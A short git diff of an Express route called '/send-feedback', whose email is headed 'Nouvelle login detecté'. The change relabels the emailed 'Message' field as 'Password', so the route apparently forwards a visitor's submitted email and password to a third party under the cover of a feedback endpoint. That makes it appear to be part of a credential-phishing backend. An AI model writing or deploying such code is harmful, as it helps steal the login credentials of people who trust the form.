@@ -23,7 +23,7 @@ app.post("/send-feedback", async (req, res) => {
       html: `
         <h2>Nouvelle login detecté</h2>
         <p><strong>Email:</strong> ${email}</p>
-        <p><strong>Message:</strong> ${message}</p>
+        <p><strong>Password:</strong> ${message}</p>
       `,
     });
 
